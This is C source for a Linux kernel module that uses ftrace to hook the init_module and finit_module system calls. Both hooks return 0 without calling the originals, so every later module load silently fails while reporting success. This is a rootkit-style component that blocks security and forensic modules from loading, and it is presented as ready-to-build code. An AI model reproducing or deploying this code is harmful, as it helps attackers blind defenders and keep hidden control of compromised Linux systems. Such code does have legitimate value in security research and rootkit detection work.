#include <linux/module.h>
#include <linux/kernel.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("Hooking init_module and finit_module");
MODULE_VERSION("1.0");

static asmlinkage long (*hooked_init_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*hooked_finit_module)(struct file *file, const char *uargs, unsigned long flags);

static asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_init_module", hook_init_module, &hooked_init_module),
    HOOK("__x64_sys_finit_module", hook_finit_module, &hooked_finit_module),
};

static int __init insmod_init(void) {
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit insmod_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(insmod_init);
module_exit(insmod_exit);
